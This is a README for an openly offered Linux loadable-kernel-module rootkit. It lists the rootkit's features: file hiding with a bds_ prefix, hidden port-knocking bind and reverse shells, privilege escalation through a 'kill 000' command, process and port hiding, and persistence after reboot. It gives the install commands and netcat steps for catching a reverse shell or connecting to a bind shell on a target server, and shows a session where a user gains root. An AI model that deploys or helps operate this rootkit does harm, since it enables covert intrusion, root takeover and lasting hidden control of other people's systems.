<h2>BDS LKM ROOTKIT</h2>
<p>
Linux Loadable Kernel Module Rootkit for x64 Linux Kernel 5.x and 6.x.

<br>
Developed by : Antonius 
<br>
Website : www.bluedragonsec.com
<br>
github : https://github.com/bluedragonsecurity
<br>
https://twitter.com/bluedragonsec
<br>  
Features : 
<ul>
  <li>hide files and directories with prefix bds_</li>
  <li>port knocking bind shell</li>
  <li>port knocking reverse shell</li>
  <li>privilege escalation using kill 000 command</li>
  <li>hide bind shell and reverse shell port from netstat</li>
  <li>hide bind shell and reverse shell process</li>
  <li>rootkit persistence to survice after reboot</li>

</p>
<h3>Installation</h3>
<p>
In case you have installed linux kernel headers, make and gcc, install it by running the installer script:
<br>
<pre>
./install.sh direct
</pre>
<br>
In case you haven't installed linux kernel headers, make and gcc, install it by running the installer script  :
<br>
<pre>
./install.sh
</pre>
<br>
</p>
<h3>Using the Rootkit</h3>
<p>
<b>Privilege Escalation</b>  
<br>
Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing : <b>kill 000</b>
<pre>
robotsoft@robotsoft:~$ id
uid=1000(robotsoft) gid=1000(robotsoft) groups=1000(robotsoft),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare)
robotsoft@robotsoft:~$ kill 000
robotsoft@robotsoft:~$ id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare),1000(robotsoft)
</pre>  
</p>
<p>
<b>Activating Reverse Shell</b>
<br>
To activate reverse shell, you need to set up a port listener using netcat on port 31337, then do port knocking to your target server (with rootkit installed) on port 1337.
<br>
On your machine, open terminal and type:
<br>
<pre>
nc -l -p 31337 -v
</pre>  
Open another terminal tab and do port knocking to target server :
<pre>
nc server ip 1337
</pre>  
Wait a few seconds and you will get reverse shell port connection from your target server.
</p>
<p>
<b>Activating Bind Shell</b>
<br>
To activate bind shell, you need to do port knocking to your target server (with rootkit installed) on port 1338.
<br>
On your machine, open terminal and type:
<pre>
nc server ip 1338
</pre>  
Wait a few seconds then type:
<pre>
nc server ip 31337
</pre>
</p>
<p>
<b>Hiding Files and Directories</b>
<br>
To hide file and directory just give prefix bds_ to file name and directory name
</p>
